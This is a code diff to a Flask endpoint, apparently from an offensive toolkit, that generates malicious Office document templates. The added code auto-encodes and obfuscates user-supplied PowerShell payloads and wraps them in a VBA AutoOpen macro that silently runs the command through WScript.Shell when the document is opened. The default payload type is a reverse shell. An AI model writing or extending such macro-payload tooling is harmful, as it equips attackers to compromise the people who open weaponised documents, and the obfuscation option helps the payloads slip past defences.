@@ -16,6 +16,10 @@ from office_template_injector import (
     get_injector, DocumentType, PayloadType, InjectionMethod
 )
 
+# Add cybermodules for encoder
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+from cybermodules.payload_generator import PowerShellEncoder
+
 office_template_bp = Blueprint('office_template', __name__, url_prefix='/office-template')
 
 
@@ -47,6 +51,7 @@ def create_template():
         payload_type = data.get('payload_type', 'reverse_shell')
         custom_payload = data.get('custom_payload')
         custom_payload_mode = data.get('custom_payload_mode', False)
+        obfuscation_level = data.get('obfuscation_level', 'basic')  # 'none', 'basic', 'advanced'
         
         # Payload parameters
         payload_params = {}
@@ -58,7 +63,42 @@ def create_template():
         # Custom payload mode: use direct payload instead of auto-generation
         if custom_payload_mode and payload_params.get('payload'):
             payload_type = 'custom'
-            # Don't override the custom payload
+            
+            # AUTO-ENCODE: Custom payload'ı PowerShell one-liner'a dönüştür
+            raw_payload = payload_params['payload'].strip()
+            
+            # Detect language and prepare encoding
+            if raw_payload.lower().startswith('powershell') or 'powershell' in raw_payload.lower():
+                # Already a PS one-liner, just wrap it
+                payload_params['payload'] = raw_payload
+            elif any(raw_payload.startswith(x) for x in ['IEX', '$', 'Import-Module', '[', 'Add-Type']):
+                # PowerShell code detected - encode it
+                try:
+                    encoded_ps = PowerShellEncoder.generate_oneliner(
+                        raw_payload, 
+                        obfuscation_level=obfuscation_level
+                    )
+                    
+                    # If result is VBA code (contains "Sub AutoOpen"), use it directly
+                    if 'Sub AutoOpen' in encoded_ps:
+                        payload_params['payload'] = encoded_ps
+                        custom_payload = encoded_ps  # Override custom_payload too
+                    else:
+                        # It's a one-liner, wrap in VBA
+                        vba_wrapper = f"""Sub AutoOpen()
+    Dim cmd As String
+    cmd = "{encoded_ps}"
+    CreateObject("WScript.Shell").Run cmd, 0, False
+End Sub"""
+                        payload_params['payload'] = vba_wrapper
+                        custom_payload = vba_wrapper
+                except Exception as e:
+                    sys.stderr.write(f"[OFFICE_TEMPLATE] Encoding error: {e}\n")
+                    # Fallback to original
+                    payload_params['payload'] = raw_payload
+            else:
+                # Keep as-is (bash, python, etc.)
+                payload_params['payload'] = raw_payload
         
         injector = get_injector()
         template = injector.create_malicious_template(
@@ -70,16 +110,20 @@ def create_template():
             use_custom_payload_direct=custom_payload_mode
         )
         
+        sys.stderr.write(f"[OFFICE_TEMPLATE] Template created: {name} | Obfuscation: {obfuscation_level} | Size: {len(template.payload)}\n")
+        
         return jsonify({
             'success': True,
             'template_id': template.template_id,
             'name': template.name,
             'doc_type': template.doc_type.value,
             'payload_type': 'custom' if custom_payload_mode else template.payload_type.value,
+            'obfuscation_level': obfuscation_level,
             'payload_preview': template.payload[:200] + '...' if len(template.payload) > 200 else template.payload,
             'payload_size': len(template.payload)
         })
     except Exception as e:
+        sys.stderr.write(f"[OFFICE_TEMPLATE] Error: {str(e)}\n")
         return jsonify({'success': False, 'error': str(e)}), 500
 
 
